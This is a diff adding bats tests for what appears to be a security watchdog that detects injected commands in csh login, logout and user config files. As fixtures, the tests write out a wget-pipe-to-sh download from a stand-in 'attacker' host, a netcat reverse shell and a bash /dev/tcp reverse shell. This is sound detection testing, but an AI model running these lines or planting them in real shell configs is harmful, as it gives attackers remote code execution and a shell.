@@ -227,3 +227,42 @@ seed_benign() {
     FILES_V="${CSHRC} ${CSHLOGIN}" run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (csh.logout axis — third per-login file — also scanned)" {
+    # /etc/csh.logout is sourced at logout time — a per-session
+    # exec surface. Sister axis to csh.cshrc + csh.login.
+    CSHLOGOUT="${TMP}/csh.logout"
+    seed_benign
+    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# csh.logout\nwget -qO- http://attacker/p | sh\n' > "${CSHLOGOUT}"
+    FILES_V="${CSHRC} ${CSHLOGOUT}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (nc reverse-shell variant in csh config: netcat-listening pipe also detected)" {
+    # Sister to sshrc-watchdog nc reverse-shell variant INVARIANT.
+    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are
+    # a canonical RCE primitive. Lock detection alongside the
+    # bash /dev/tcp variant.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# csh.cshrc\nnc -e /bin/sh 1.1.1.1 4444\n' > "${CSHRC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (sample names offending file in JSON — operator triage routing)" {
+    # When injection-pattern alert fires, sample MUST surface the
+    # file path so operator dashboard routes triage to the right
+    # path. Sister contract: sshrc/polkit-rules/nfs-exports/rhosts/
+    # tmpfiles/securetty sample-naming pattern.
+    USER_CSHRC="${TMP}/user-distinctive-attacker.cshrc"
+    seed_benign
+    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# user csh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USER_CSHRC}"
+    FILES_V="${CSHRC} ${USER_CSHRC}" run_wd
+    cap | grep -q 'user-distinctive-attacker'
+}
